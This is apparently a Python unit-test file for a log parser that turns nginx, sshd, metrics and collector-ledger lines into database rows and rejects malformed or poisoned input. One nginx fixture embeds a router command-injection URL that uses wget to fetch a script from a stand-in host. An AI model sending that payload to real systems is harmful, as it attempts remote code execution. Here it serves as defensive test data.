#!/usr/bin/env python3
"""에이전트 파서 단위 시험. DB 없이 parse · parse_collector 만 본다.  python3 parser/test_parse_agent.py

web-01 이 실제로 남기는 줄(nginx escape=json · Ubuntu 24.04 auth.log · 지표 · 관문 원장)은
설계대로 바뀌어야 하고, 독이 되는 줄(NUL · 서로게이트 · 큰 정수 · 영역 ID · 객체가 아닌 JSON · 4MiB 넘는 줄)이
와도 예외 없이 건너뛰거나, 적재가 실패하지 않는 행을 만들어야 한다.
"""
import hashlib
import ipaddress
import json
import os
import random
import subprocess
import sys
import unittest
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import parse_agent as pa  # noqa: E402

NODE, HOST = "web-01", "opsloop-web-01"
EX = {"127.0.0.1", "112.76.112.180"}


def sha1(s):
    return hashlib.sha1(s.encode("utf-8")).hexdigest()


def run(job, line, exclusions=EX, host=HOST):
    return pa.parse(NODE, host, job, line, exclusions)


def nginx_line(**kw):
    """log_format opsloop escape=json 이 찍는 모양. 모든 값이 문자열이다."""
    ev = {"ts": "1789977271.123", "rid": "4f1c2a8e9b7d6c5e4f3a2b1c0d9e8f7a", "host": HOST,
          "src_ip": "203.0.113.7", "src_port": "51234", "dst_port": "80", "method": "GET",
          "uri": "/", "status": "200", "bytes": "612", "ua": "curl/8.5.0", "rt": "0.000"}
    ev.update(kw)
    return json.dumps(ev, separators=(",", ":"))


def metrics_line(**kw):
    ev = {"ts": "2026-09-21T07:00:00.123456+00:00", "host": HOST, "seq": 123, "cpu_pct": 1.2,
          "mem_used_pct": 40.1, "mem_avail_mb": 400, "swap_used_pct": 0.0, "disk_root_pct": 23.0,
          "load1": 0.05, "nginx_active": True, "sshd_active": True}
    ev.update(kw)
    return json.dumps(ev)


def auth(body, tag="sshd[1234]", host=HOST, ts="2026-09-21T16:54:31.123456+09:00"):
    return f"{ts} {host} {tag}: {body}"


def gate_line(**kw):
    ev = {"ts": "2026-10-01T05:12:03.481220+00:00", "boot": "b7c1e2", "seq": 17,
          "eventid": "collector.agent.rejected", "src_ip": "192.168.50.21", "dst_port": 3101,
          "path": "/loki/api/v1/push", "reason": "unknown", "count": 1, "distinct_fp": 1,
          "fps": ["3f9a1c0e"], "ua": "Alloy/v1.19.2"}
    ev.update(kw)
    return json.dumps(ev, ensure_ascii=False)


class Loadable:
    """행이 PostgreSQL 에 그대로 들어가는지 본다 (NUL · 서로게이트 · int4 · inet)."""

    INT_COLS = {"src_port", "dst_port", "duration_ms", "http_status", "mem_avail_mb"}
    REAL_COLS = {"cpu_pct", "mem_used_pct", "swap_used_pct", "disk_root_pct", "load1"}

    def assertLoadable(self, kind, row):
        cols = pa.EVENT_COLUMNS if kind == "event" else pa.METRIC_COLUMNS
        self.assertEqual(tuple(row), cols)                 # 키와 순서가 열 목록과 같다
        self.assertRegex(row["line_hash"], r"^[0-9a-f]{40}$")
        self.assertIsInstance(row["ts"], datetime)
        self.assertEqual(row["ts"].utcoffset().total_seconds(), 0)
        for k, v in row.items():
            if isinstance(v, str):
                self.assertNotIn("\x00", v, k)
                v.encode("utf-8")                          # 짝 없는 서로게이트가 남으면 여기서 터진다
            if k in self.INT_COLS and v is not None:
                self.assertTrue(pa.INT4[0] <= v <= pa.INT4[1], k)
            if k in self.REAL_COLS and v is not None:
                self.assertTrue(-3.4e38 < v < 3.4e38, k)
        if kind == "metric" and row["seq"] is not None:
            self.assertTrue(0 <= row["seq"] <= pa.INT8_MAX)
        if kind == "event" and row["src_ip"] is not None:
            self.assertNotIn("%", row["src_ip"])
            ipaddress.ip_address(row["src_ip"])
        for k in ("eventid", "sensor", "provenance"):
            if kind == "event":
                self.assertTrue(row[k])


class NginxTest(Loadable, unittest.TestCase):
    def test_첫_수신_탐침_줄(self):
        line = nginx_line(src_ip="127.0.0.1", src_port="41822", uri="/opsloop-first-receipt/n0nce42",
                          status="204", bytes="0", rt="0.004")
        kind, row = run("nginx", line)
        self.assertEqual(kind, "event")
        self.assertLoadable(kind, row)
        self.assertEqual(row["line_hash"], sha1(line))
        self.assertEqual(row["ts"], datetime(2026, 9, 21, 7, 54, 31, 123000, tzinfo=timezone.utc))
        self.assertEqual((row["eventid"], row["sensor"], row["protocol"]), ("nginx.request", NODE, "http"))
        self.assertEqual((row["src_ip"], row["src_port"], row["dst_port"]), ("127.0.0.1", 41822, 80))
        self.assertEqual((row["http_method"], row["http_status"], row["url"]),
                         ("GET", 204, "/opsloop-first-receipt/n0nce42"))
        self.assertEqual((row["user_agent"], row["duration_ms"]), ("curl/8.5.0", 4))
        self.assertEqual(row["provenance"], "fixture")      # 127.0.0.1 은 제외 목록에 있다
        self.assertIsNone(row["message"])
        self.assertIsNone(row["session"])

    def test_실제_exclusions_파일에_탐침_주소가_있음(self):
        ex = pa.load_exclusions(pa.DEFAULT_EXCLUSIONS)
        self.assertIn("127.0.0.1", ex)
        _, row = run("nginx", nginx_line(src_ip="127.0.0.1"), ex)
        self.assertEqual(row["provenance"], "fixture")
        _, row = run("nginx", nginx_line(), ex)
        self.assertEqual(row["provenance"], "real")

    def test_escape_json_이_찍은_줄(self):
        # nginx escape=json 은 " \ 와 제어 문자를 \uXXXX 로 적는다. 0x80 이상 바이트는 그대로 둔다
        line = ('{"ts":"1789977280.456","rid":"a1b2c3d4e5f60718293a4b5c6d7e8f90","host":"opsloop-web-01",'
                '"src_ip":"198.51.100.23","src_port":"60211","dst_port":"80","method":"POST",'
                '"uri":"/cgi-bin/luci/;stok=/locale?form=country&country=$(id>`wget -O- http://x/a.sh`)",'
                '"status":"404","bytes":"162",'
                '"ua":"Mozilla/5.0 \\"zgrab\\" C:\\\\x \\u0000nul \\u001b[31m 한글","rt":"0.001"}')
        kind, row = run("nginx", line)
        self.assertEqual(kind, "event")
        self.assertLoadable(kind, row)
        self.assertEqual(row["user_agent"], 'Mozilla/5.0 "zgrab" C:\\x nul \x1b[31m 한글')
        self.assertEqual(row["url"], "/cgi-bin/luci/;stok=/locale?form=country&country=$(id>`wget -O- http://x/a.sh`)")
        self.assertEqual((row["http_method"], row["http_status"], row["duration_ms"]), ("POST", 404, 1))
        self.assertEqual(row["ts"].microsecond, 456000)
        self.assertEqual(row["line_hash"], sha1(line))

    def test_끝_줄바꿈과_공백은_해시에_넣지_않음(self):
        line = nginx_line()
        self.assertEqual(run("nginx", line + "\n")[1]["line_hash"], sha1(line))

    def test_다른_호스트는_foreign_host(self):
        self.assertEqual(run("nginx", nginx_line(host="ubuntu")), ("skip", "foreign_host"))
        self.assertEqual(run("nginx", nginx_line(host=None)), ("skip", "foreign_host"))

    def test_형식이_다르면_malformed(self):
        for line in ['{"ts":"1789977271.123"}',                        # host 없음
                     nginx_line(ts="2026-09-21T07:54:31Z"), nginx_line(ts="1e9"), nginx_line(ts="-1"),
                     nginx_line(ts=1789977271.123), nginx_line(ts=""),
                     "[1,2]", '"x"', "123", "null", "{bad", "[" * 100000, "", "   ",
                     '127.0.0.1 - - [21/Sep/2026:16:54:31 +0900] "GET / HTTP/1.1" 200 612']:  # combined 형식
            self.assertEqual(run("nginx", line), ("skip", "malformed"), line[:60])

    def test_이상한_값은_비우거나_자름(self):
        line = nginx_line(src_ip="fe80::1%eth0", src_port="99999999999", status="2" + "0" * 30,
                          dst_port="", rt="abc", method=["GET"], uri="/" + "a" * 5000, ua="u" * 5000)
        kind, row = run("nginx", line)
        self.assertLoadable(kind, row)
        self.assertIsNone(row["src_ip"])
        self.assertEqual((row["src_port"], row["http_status"], row["dst_port"], row["duration_ms"]),
                         (None, None, None, None))
        self.assertEqual(row["http_method"], '["GET"]')
        self.assertEqual((len(row["url"]), len(row["user_agent"])), (2048, 512))
        self.assertEqual(row["provenance"], "real")
        _, row = run("nginx", nginx_line(src_ip="unix:"))
        self.assertIsNone(row["src_ip"])
        _, row = run("nginx", nginx_line(src_ip="2001:db8::7"))
        self.assertEqual(row["src_ip"], "2001:db8::7")

    def test_JSON_숫자로_온_큰_값(self):
        kind, row = run("nginx", '{"ts":"1789977271.123","host":"opsloop-web-01","src_port":1e400,"status":99999999999}')
        self.assertLoadable(kind, row)
        self.assertEqual((row["src_port"], row["http_status"]), (None, None))
        # 4300자리 넘는 정수는 3.11 이상의 json 이 거부한다(malformed). 그 전 판에서는 값만 비운다
        kind, row = run("nginx", '{"ts":"1789977271.123","host":"opsloop-web-01","status":' + "9" * 5000 + "}")
        if kind == "event":
            self.assertLoadable(kind, row)
            self.assertIsNone(row["http_status"])
        else:
            self.assertEqual(row, "malformed")

    def test_서로게이트(self):
        # JSON 이스케이프로 온 것과 문자열에 날것으로 섞인 것 둘 다
        for line in ['{"ts":"1789977271.123","host":"opsloop-web-01","uri":"/\\ud800x","ua":"\\udc80"}',
                     nginx_line().replace('"uri":"/"', '"uri":"/\ud800x"')]:
            kind, row = run("nginx", line)
            self.assertEqual(kind, "event")
            self.assertLoadable(kind, row)
            self.assertEqual(row["url"], "/?x")
        self.assertNotEqual(run("nginx", nginx_line(uri="/\ud800"))[1]["line_hash"],
                            run("nginx", nginx_line(uri="/?"))[1]["line_hash"])   # 대체해도 해시는 겹치지 않음

    def test_4MiB_넘는_줄(self):
        line = nginx_line(uri="/" + "a" * pa.MAX_LINE)
        self.assertEqual(run("nginx", line), ("skip", "malformed"))


class AuthTest(Loadable, unittest.TestCase):
    def test_비밀번호_실패(self):
        line = auth("Failed password for root from 203.0.113.9 port 50022 ssh2")
        kind, row = run("auth", line)
        self.assertEqual(kind, "event")
        self.assertLoadable(kind, row)
        self.assertEqual(row["line_hash"], sha1(line))
        self.assertEqual(row["ts"], datetime(2026, 9, 21, 7, 54, 31, 123456, tzinfo=timezone.utc))
        self.assertEqual((row["eventid"], row["username"], row["src_ip"], row["src_port"], row["dst_port"]),
                         ("sshd.login.failed", "root", "203.0.113.9", 50022, 22))
        self.assertEqual((row["session"], row["protocol"], row["sensor"], row["provenance"]),
                         ("web-01/sshd/1234", "ssh", NODE, "real"))
        self.assertEqual(row["message"], "Failed password for root from 203.0.113.9 port 50022 ssh2")
        self.assertIsNone(row["password"])

    def test_잘못된_사용자(self):
        kind, row = run("auth", auth("Invalid user admin from 203.0.113.9 port 50022"))
        self.assertEqual((kind, row["eventid"], row["username"]), ("event", "sshd.login.invalid_user", "admin"))

    def test_잘못된_사용자의_비밀번호_실패는_이중_집계하지_않음(self):
        self.assertEqual(run("auth", auth("Failed password for invalid user admin from 203.0.113.9 port 50022 ssh2")),
                         ("skip", "unmatched"))
        # 'invalid' 라는 이름의 계정은 다르다
        self.assertEqual(run("auth", auth("Failed password for invalid from 203.0.113.9 port 1 ssh2"))[1]["username"],
                         "invalid")

    def test_로그인_성공(self):
        kind, row = run("auth", auth("Accepted publickey for ubuntu from 192.168.70.1 port 51514 ssh2: "
                                     "ED25519 SHA256:3q2+7w7t6Qx0mJ4b1s9yX2Zb5b8x5nPj1q8dG0k9sLw"))
        self.assertEqual((kind, row["eventid"], row["username"], row["src_ip"], row["src_port"]),
                         ("event", "sshd.login.success", "ubuntu", "192.168.70.1", 51514))
        kind, row = run("auth", auth("Accepted password for ubuntu from 127.0.0.1 port 40000 ssh2"))
        self.assertEqual((row["eventid"], row["provenance"]), ("sshd.login.success", "fixture"))

    def test_rsyslog_반복_축약(self):
        self.assertEqual(run("auth", auth("message repeated 3 times: [ Failed password for root from "
                                          "203.0.113.9 port 50022 ssh2]")), ("skip", "repeated"))

    def test_관심_없는_줄은_unmatched(self):
        for line in [
            auth("pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= "
                 "rhost=203.0.113.9  user=root"),
            auth("pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by ubuntu(uid=0)"),
            auth("Connection closed by authenticating user root 203.0.113.9 port 50022 [preauth]"),
            auth("Received disconnect from 203.0.113.9 port 50022:11: Bye Bye [preauth]"),
            auth("Disconnected from user ubuntu 192.168.70.1 port 51514"),
            auth("error: kex_exchange_identification: Connection closed by remote host"),
            auth("Server listening on 0.0.0.0 port 22."),
            auth("Failed publickey for root from 203.0.113.9 port 50022 ssh2: RSA SHA256:abc"),
            auth("", tag="sshd[1234]"),
            auth("ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/true", tag="sudo"),
            auth("pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)", tag="sudo"),
            auth("pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by ubuntu(uid=0)",
                 tag="(systemd)[1587]"),
            auth("New session 5 of user ubuntu.", tag="systemd-logind[812]"),
            auth("pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)", tag="CRON[2211]"),
            auth("Failed password for root from 203.0.113.9 port 50022 ssh2", tag="sshd"),         # pid 없음
            auth("Failed password for root from 203.0.113.9 port 50022 ssh2", tag="sshdx[1]"),
            auth("Failed password for root from 203.0.113.9 port 50022 ssh2", tag="sshd[" + "9" * 20 + "]"),
        ]:
            self.assertEqual(run("auth", line), ("skip", "unmatched"), line)

    def test_sshd_session_과_sshd_auth(self):
        for tag in ("sshd-session[5678]", "sshd-auth[5678]"):
            kind, row = run("auth", auth("Failed password for root from 203.0.113.9 port 50022 ssh2", tag=tag))
            self.assertEqual((kind, row["eventid"], row["session"]), ("event", "sshd.login.failed", "web-01/sshd/5678"))

    def test_다른_호스트는_foreign_host(self):
        line = auth("Failed password for root from 203.0.113.9 port 50022 ssh2", host="ubuntu")
        self.assertEqual(run("auth", line), ("skip", "foreign_host"))
        self.assertEqual(run("auth", auth("x", tag="sudo", host="ubuntu")), ("skip", "foreign_host"))

    def test_머리가_다르면_malformed(self):
        for line in ["Sep 21 16:54:31 opsloop-web-01 sshd[1234]: Failed password for root from 1.2.3.4 port 5 ssh2",
                     auth("Failed password for root from 1.2.3.4 port 5 ssh2", ts="2026-09-21T16:54:31.123456"),
                     auth("x", ts="2026-13-21T16:54:31+09:00"), auth("x", ts="0001-01-01T00:00:00+09:00"),
                     auth("x", ts="2026-09-21T16:54:31+24:00"), auth("x", ts="2026-09-21T23:59:60+09:00"),
                     auth("x", ts="2026-09-21T16:54:31.1234567+09:00"), auth("x", ts="2026-09-21 16:54:31+09:00"),
                     "2026-09-21T16:54:31.123456+09:00", "", "\x00\x00"]:
            self.assertEqual(run("auth", line), ("skip", "malformed"), line[:60])

    def test_시간대(self):
        for ts, want in [("2026-09-21T02:24:31.5-05:30", datetime(2026, 9, 21, 7, 54, 31, 500000, tzinfo=timezone.utc)),
                         ("2026-09-21T07:54:31Z", datetime(2026, 9, 21, 7, 54, 31, tzinfo=timezone.utc)),
                         ("2026-09-21T07:54:31+00:00", datetime(2026, 9, 21, 7, 54, 31, tzinfo=timezone.utc))]:
            self.assertEqual(run("auth", auth("Invalid user a from 1.2.3.4 port 5", ts=ts))[1]["ts"], want, ts)

    def test_이름으로_출발지를_위장해도_sshd_가_붙인_주소를_씀(self):
        kind, row = run("auth", auth("Invalid user x from 6.6.6.6 port 1 from 203.0.113.9 port 50022"))
        self.assertEqual((row["src_ip"], row["src_port"], row["username"]),
                         ("203.0.113.9", 50022, "x from 6.6.6.6 port 1"))
        kind, row = run("auth", auth("Invalid user  from 203.0.113.9 port 50022"))
        self.assertEqual((row["eventid"], row["username"]), ("sshd.login.invalid_user", ""))
        kind, row = run("auth", auth("Invalid user a b from 203.0.113.9 port 50022"))
        self.assertEqual(row["username"], "a b")

    def test_독_값(self):
        cases = [auth("Invalid user adm\x00in from fe80::1%ens160 port 99999999999"),
                 auth("Invalid user \ud800 from 2001:db8::9 port 50022"),
                 auth("Invalid user " + "u" * 5000 + " from not-an-ip port 1"),
                 auth("Failed password for root from 203.0.113.9 port " + "9" * 5000 + " ssh2"),
                 auth("Invalid user #033[31mred from 203.0.113.9 port 1")]      # rsyslog 가 제어 문자를 #033 으로 적은 줄
        rows = [run("auth", ln) for ln in cases]
        for kind, row in rows:
            self.assertEqual(kind, "event")
            self.assertLoadable(kind, row)
        self.assertEqual((rows[0][1]["username"], rows[0][1]["src_ip"], rows[0][1]["src_port"]), ("admin", None, None))
        self.assertEqual((rows[1][1]["username"], rows[1][1]["src_ip"]), ("?", "2001:db8::9"))
        self.assertEqual((len(rows[2][1]["username"]), rows[2][1]["src_ip"], len(rows[2][1]["message"])), (256, None, 512))
        self.assertIsNone(rows[3][1]["src_port"])
        self.assertEqual(rows[4][1]["username"], "#033[31mred")


class MetricsTest(Loadable, unittest.TestCase):
    def test_정상_줄(self):
        line = metrics_line()
        kind, row = run("metrics", line)
        self.assertEqual(kind, "metric")
        self.assertLoadable(kind, row)
        self.assertEqual(row, {
            "line_hash": sha1(line), "node_id": NODE,
            "ts": datetime(2026, 9, 21, 7, 0, 0, 123456, tzinfo=timezone.utc), "seq": 123,
            "cpu_pct": 1.2, "mem_used_pct": 40.1, "mem_avail_mb": 400, "swap_used_pct": 0.0,
            "disk_root_pct": 23.0, "load1": 0.05, "nginx_active": True, "sshd_active": True})

    def test_빈_값과_정수인_실수는_받음(self):
        kind, row = run("metrics", metrics_line(cpu_pct=None, nginx_active=None, mem_avail_mb=400.0, seq=0, load1=3))
        self.assertEqual(kind, "metric")
        self.assertEqual((row["cpu_pct"], row["nginx_active"], row["mem_avail_mb"], row["seq"], row["load1"]),
                         (None, None, 400, 0, 3.0))
        self.assertIsInstance(row["mem_avail_mb"], int)
        _, row = run("metrics", metrics_line(ts="2026-09-21T16:00:00.5+09:00"))
        self.assertEqual(row["ts"], datetime(2026, 9, 21, 7, 0, 0, 500000, tzinfo=timezone.utc))

    def test_다른_호스트(self):
        self.assertEqual(run("metrics", metrics_line(host="ubuntu")), ("skip", "foreign_host"))

    def test_숫자_검증_실패는_malformed(self):
        bad = [dict(seq=None), dict(seq=-1), dict(seq=True), dict(seq="5"), dict(seq=2**63), dict(seq=1.5),
               dict(cpu_pct=101), dict(cpu_pct=-0.1), dict(cpu_pct="1.2"), dict(cpu_pct=True), dict(cpu_pct=[1]),
               dict(mem_avail_mb=1.5), dict(mem_avail_mb=2**31), dict(mem_avail_mb=-1),
               dict(load1=1e300), dict(nginx_active="yes"), dict(sshd_active=1),
               dict(ts="2026-09-21T07:00:00"), dict(ts="yesterday"), dict(ts=None)]
        for kw in bad:
            self.assertEqual(run("metrics", metrics_line(**kw)), ("skip", "malformed"), kw)
        for raw in ["NaN", "Infinity", "-Infinity", "1e400", "9" * 400]:
            line = metrics_line().replace('"cpu_pct": 1.2', '"cpu_pct": ' + raw)
            self.assertIn(raw, line)
            self.assertEqual(run("metrics", line), ("skip", "malformed"), raw)
        line = metrics_line().replace('"seq": 123', '"seq": ' + "9" * 5000)
        self.assertEqual(run("metrics", line), ("skip", "malformed"))
        for line in ['{"host":"opsloop-web-01"}', "[]", "1", '"x"', "{", ""]:
            self.assertEqual(run("metrics", line), ("skip", "malformed"), line)


class DispatchTest(unittest.TestCase):
    def test_모르는_job(self):
        for job in ("syslog", "", None, "NGINX", ["nginx"], "collector"):
            self.assertEqual(run(job, nginx_line()), ("skip", "undeclared"), job)

    def test_글자가_아닌_줄(self):
        self.assertEqual(run("nginx", b"{}"), ("skip", "malformed"))
        self.assertEqual(pa.parse_collector(None), ("skip", "malformed"))

    def test_DB_모듈을_부르지_않음(self):
        code = ("import sys; sys.path.insert(0, sys.argv[1]); import parse_agent; "
                "bad = [m for m in ('psycopg2', 'botocore', 'boto3') if m in sys.modules]; "
                "sys.exit(1 if bad else 0)")
        self.assertEqual(subprocess.run([sys.executable, "-c", code, HERE]).returncode, 0)


class CollectorTest(Loadable, unittest.TestCase):
    def test_거부_줄(self):
        line = gate_line()
        kind, row = pa.parse_collector(line)
        self.assertEqual(kind, "event")
        self.assertLoadable(kind, row)
        self.assertEqual(row["line_hash"], sha1(line))
        self.assertEqual(row["ts"], datetime(2026, 10, 1, 5, 12, 3, 481220, tzinfo=timezone.utc))
        self.assertEqual((row["eventid"], row["sensor"], row["provenance"]),
                         ("collector.agent.rejected", "collector", "real"))
        self.assertEqual((row["src_ip"], row["dst_port"], row["url"], row["user_agent"]),
                         ("192.168.50.21", 3101, "/loki/api/v1/push", "Alloy/v1.19.2"))
        self.assertEqual(row["input"], "reason=unknown count=1 fps=3f9a1c0e")
        self.assertIsNone(row["message"])
        self.assertIsNone(row["username"])

    def test_묶음_줄과_노드를_아는_거부(self):
        _, row = pa.parse_collector(gate_line(seq=18, reason="revoked", count=42, distinct_fp=3,
                                              fps=["3f9a1c0e", "0b1c2d3e", "99aa00ff"], node_id="probe-01",
                                              src_ip="192.168.70.1"))
        self.assertEqual(row["input"], "reason=revoked count=42 fps=3f9a1c0e,0b1c2d3e,99aa00ff")
        self.assertEqual((row["username"], row["src_ip"]), ("probe-01", "192.168.70.1"))

    def test_등록_성공과_제한(self):
        kind, row = pa.parse_collector(gate_line(eventid="collector.agent.enrolled", path="/opsloop/v1/enroll",
                                                 reason="ok", node_id="web-01", fps=["a1b2c3d4"]))
        self.assertEqual((kind, row["eventid"], row["username"]), ("event", "collector.agent.enrolled", "web-01"))
        kind, row = pa.parse_collector(gate_line(eventid="collector.agent.throttled", reason="413",
                                                 fps=[], node_id="web-01"))
        self.assertEqual(row["input"], "reason=413 count=1 fps=")

    def test_관리_원장_줄(self):
        line = json.dumps({"ts": "2026-09-21T08:00:00.000001+00:00", "eventid": "collector.admin.issue",
                           "node_id": "web-01", "issued_by": "hanseongmin",
                           "expires_at": "2026-09-21T09:00:00+00:00", "token": "olE_여기에는_오면_안_됨"},
                          ensure_ascii=False)
        kind, row = pa.parse_collector(line)
        self.assertEqual(kind, "event")
        self.assertLoadable(kind, row)
        self.assertEqual((row["eventid"], row["username"], row["sensor"]),
                         ("collector.admin.issue", "hanseongmin", "collector"))
        self.assertEqual(row["input"], "node_id=web-01 expires_at=2026-09-21T09:00:00+00:00")
        self.assertNotIn("olE_", json.dumps(row, default=str))    # 모르는 키는 옮기지 않는다
        self.assertIsNone(row["src_ip"])

    def test_시간대_없는_원장_시각은_UTC(self):
        _, row = pa.parse_collector(gate_line(ts="2026-10-01T05:12:03.481220"))
        self.assertEqual(row["ts"], datetime(2026, 10, 1, 5, 12, 3, 481220, tzinfo=timezone.utc))

    def test_다른_출처를_흉내_낸_줄은_받지_않음(self):
        for line in [gate_line(eventid="console.login.success"), gate_line(eventid="decoy.request"),
                     gate_line(eventid="collector"), gate_line(eventid=None), gate_line(eventid=["collector.x"]),
                     gate_line(ts=None), gate_line(ts="어제"), gate_line(ts=1790000000),
                     "[1]", '"collector.agent.rejected"', "{bad", "[" * 100000, "", "\n",
                     gate_line(ua="a" * pa.MAX_LINE)]:
            self.assertEqual(pa.parse_collector(line), ("skip", "malformed"), line[:60])

    def test_독_값(self):
        line = gate_line(ua="Alloy\x00/" + "x" * 1000, path="/" + "p" * 5000, src_ip="fe80::1%eth0",
                         dst_port=2**40, fps="3f9a1c0e", count=10**300, reason="\ud800")
        kind, row = pa.parse_collector(line)
        self.assertLoadable(kind, row)
        self.assertEqual((len(row["user_agent"]), len(row["url"])), (512, 2048))
        self.assertTrue(row["user_agent"].startswith("Alloy/"))
        self.assertEqual((row["src_ip"], row["dst_port"]), (None, None))
        self.assertTrue(row["input"].startswith("reason=? count=1000"))
        self.assertTrue(row["input"].endswith(" fps=3f9a1c0e"))
        kind, row = pa.parse_collector(gate_line(fps=[{"a": 1}, None, 7]))
        self.assertEqual(row["input"], "reason=unknown count=1 fps={'a': 1},None,7")


class FuzzTest(Loadable, unittest.TestCase):
    """정상 줄을 무작위로 망가뜨려도 예외가 없고, 나온 행은 적재할 수 있어야 한다."""

    SEEDS = [("nginx", nginx_line(uri="/opsloop-first-receipt/abc")), ("metrics", metrics_line()),
             ("auth", auth("Failed password for root from 203.0.113.9 port 50022 ssh2")),
             ("auth", auth("Invalid user admin from 2001:db8::9 port 50022")),
             ("auth", auth("Accepted publickey for ubuntu from 192.168.70.1 port 51514 ssh2: ED25519 SHA256:x")),
             ("collector", gate_line())]
    JUNK = ["\x00", "\ud800", "\udfff", "%", "\"", "\\", "{", "}", "[", "]", ":", " ", "\n", "\u2028",
            "9" * 30, "-", ".", "e400", "NaN", "한", "\x1b", "fe80::1%eth0", "\\u0000", "\\ud800"]

    def test_무작위_변형(self):
        rnd = random.Random(20260921)
        seen = {}
        for _ in range(4000):
            job, line = rnd.choice(self.SEEDS)
            s = list(line)
            for _ in range(rnd.randint(1, 4)):
                op, i = rnd.random(), rnd.randrange(len(s) + 1)
                if op < 0.4:
                    s.insert(i, rnd.choice(self.JUNK))
                elif op < 0.7 and s:
                    del s[min(i, len(s) - 1)]
                elif s:
                    s[min(i, len(s) - 1)] = rnd.choice(self.JUNK)
            mutated = "".join(s)
            kind, v = pa.parse_collector(mutated) if job == "collector" else run(job, mutated)
            seen[kind] = seen.get(kind, 0) + 1
            if kind == "skip":
                self.assertIn(v, pa.SKIP_REASONS)
            else:
                self.assertLoadable(kind, v)
        self.assertTrue(seen.get("skip") and (seen.get("event") or seen.get("metric")), seen)


if __name__ == "__main__":
    unittest.main(verbosity=2)
